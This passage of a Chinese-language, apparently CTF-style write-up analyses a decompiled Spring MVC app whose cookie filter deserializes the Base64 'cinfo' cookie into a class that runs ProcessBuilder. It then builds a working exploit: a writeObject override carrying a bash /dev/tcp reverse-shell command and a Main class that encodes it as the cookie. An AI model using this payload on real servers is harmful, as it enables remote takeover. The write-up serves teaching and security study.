tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>clientinfo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>dispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>dispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.form<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得知带*.form类型的访问交给servlet处理，servlet就是处理http请求的类</p><p><strong>servlet详细介绍</strong>：一个请求进来经过前端控制器Dispatcher Servlet，这是前端的核心。一个请求的URL进来，经过Dispatcher Servlet转发，首先转发到Handler Mapping，②Handler Mapping的作用就是完成对URL到Controller组件的映射，然后通过Dispatcher Servlet从Handlermapping查找处理request的Controller。③ controller处理request请求后并返回ModelAndView对象，Controller是是springmvc中负责处理request的组件，ModelAndView是封装结果视图的组件。其后面的步骤就是将视图结果返回给客户端。总结：上图除了Dispatcherservlet以外其他的都是相互独立，所有请求都经过这个核心控制器进行转发控制。</p><p>还发现了这里定义了一个filter过滤，过滤一般是在http请求到达servlet之前或者之后，用于检查这个请求是否有权限。</p><p>controller里面确实没看出什么东西，我们先看到后面的tools文件夹</p><p>client.class</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment" spellcheck="true">// (powered by Fernflower decompiler)</span><span class="token comment" spellcheck="true">//</span><span class="token keyword">package</span> com<span class="token punctuation">.</span>tools<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClientInfo</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 1L<span class="token punctuation">;</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> String group<span class="token punctuation">;</span>    <span class="token keyword">private</span> String id<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ClientInfo</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String group<span class="token punctuation">,</span> String id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>group <span class="token operator">=</span> group<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>group<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义了一个类，这个类有三个属性name、group、id，分别定义了get这三个属性的方法，同时也定义了构造函数。</p><p>tools.class</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment" spellcheck="true">// (powered by Fernflower decompiler)</span><span class="token comment" spellcheck="true">//</span><span class="token keyword">package</span> com<span class="token punctuation">.</span>tools<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Tools</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 1L<span class="token punctuation">;</span>    <span class="token keyword">private</span> String testCall<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Tools</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">create</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ByteArrayOutputStream bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bos<span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream in<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        Object obj <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里比较关键的是定义了readObject函数，既然定义了这个函数，那么就有可能性是会存在反序列化漏洞了。</p><p>最后我们看filter文件夹</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment" spellcheck="true">// (powered by Fernflower decompiler)</span><span class="token comment" spellcheck="true">//</span><span class="token keyword">package</span> com<span class="token punctuation">.</span>filters<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>ClientInfo<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>Tools<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">.</span>Decoder<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">.</span>Encoder<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>Filter<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>FilterChain<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>FilterConfig<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>Cookie<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClentInfoFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">ClentInfoFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig fcg<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span> ServletResponse response<span class="token punctuation">,</span> FilterChain chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>        Cookie<span class="token punctuation">[</span><span class="token punctuation">]</span> cookies <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获取cookie</span>        <span class="token keyword">boolean</span> exist <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        Cookie cookie <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cookies <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 非空</span>            Cookie<span class="token punctuation">[</span><span class="token punctuation">]</span> var7 <span class="token operator">=</span> cookies<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 赋值给var7</span>            <span class="token keyword">int</span> var8 <span class="token operator">=</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// var8为cookie的总个数</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var9 <span class="token operator">&lt;</span> var8<span class="token punctuation">;</span> <span class="token operator">++</span>var9<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 遍历一边所有的cookie对象</span>                Cookie c <span class="token operator">=</span> var7<span class="token punctuation">[</span>var9<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"cinfo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 如果存在cookie的name等于cinfo，那么exist等于true，cookie等于name=cinfo的cookie</span>                    exist <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    cookie <span class="token operator">=</span> c<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>exist<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 如果真的存在name为info的cookie</span>            String b64 <span class="token operator">=</span> cookie<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// b64 = value</span>            Decoder decoder <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bytes <span class="token operator">=</span> decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>b64<span class="token punctuation">)</span><span class="token punctuation">;</span>            ClientInfo cinfo <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>b64<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> bytes <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    cinfo <span class="token operator">=</span> <span class="token punctuation">(</span>ClientInfo<span class="token punctuation">)</span>Tools<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 这个可以阅读到上面的代码，在parse函数中执行了反序列化操作，并且重写了readObject函数，后面的函数逻辑就不用继续看了</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var14<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    var14<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                cinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClientInfo</span><span class="token punctuation">(</span><span class="token string">"Anonymous"</span><span class="token punctuation">,</span> <span class="token string">"normal"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRequestedSessionId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Encoder encoder <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    bytes <span class="token operator">=</span> Tools<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>cinfo<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var15<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    var15<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                cookie<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>encoder<span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"cinfo"</span><span class="token punctuation">,</span> cinfo<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            Encoder encoder <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                ClientInfo cinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClientInfo</span><span class="token punctuation">(</span><span class="token string">"Anonymous"</span><span class="token punctuation">,</span> <span class="token string">"normal"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRequestedSessionId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                bytes <span class="token operator">=</span> Tools<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>cinfo<span class="token punctuation">)</span><span class="token punctuation">;</span>                cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"cinfo"</span><span class="token punctuation">,</span> encoder<span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cookie<span class="token punctuation">.</span><span class="token function">setMaxAge</span><span class="token punctuation">(</span><span class="token number">86400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletResponse<span class="token punctuation">)</span>response<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">(</span><span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"cinfo"</span><span class="token punctuation">,</span> cinfo<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var13<span class="token punctuation">)</span> <span class="token punctuation">{</span>                var13<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上述代码的注释，我们知道漏洞存在于后台默认客户端提交的数据是字符串，进行反序列化。我们可以通过这个反序列化执行的命令如下所示：</p><pre class="line-numbers language-java"><code class="language-java">Object obj <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果我们构造一个Tools类，反序列化的时候，readObject会被自动调用，然后读到的obj会被强制类型转换为String[]，达到命令执行。</p><p>确实对JAVA不是很了解，补充： ProcessBuilder类是J2SE 1.5在java.lang中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法。在J2SE 1.5之前，都是由Process类处来实现进程的控制管理。每个 ProcessBuilder 实例管理一个进程属性集。它的start() 方法利用这些属性创建一个新的 Process 实例。start() 方法可以从同一实例重复调用，以利用相同的或相关的属性创建新的子进程。</p><p>也就是说可以利用这个函数达到命令执行的目的。</p><h2 id="payload构建"><a href="#payload构建" class="headerlink" title="payload构建"></a>payload构建</h2><p>知道漏洞了，那么我们也可以考虑拿shell了：</p><p>既然有命令执行，那么我们可以rce，精心构造一段paylodad来反弹shell。</p><p>有两种方法拿shell：</p><p>第一种：重写writeObject函数</p><p>在Tools添加函数：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span>ObjectOutputStream out<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>    out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"bash -i >&amp; /dev/tcp/ip/11111 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>main函数：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Tools tools <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tools</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Base64<span class="token punctuation">.</span>Encoder e <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var20 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            var20 <span class="token operator">=</span> Tools<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>tools<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var15<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var15<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String cookie <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>var20<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 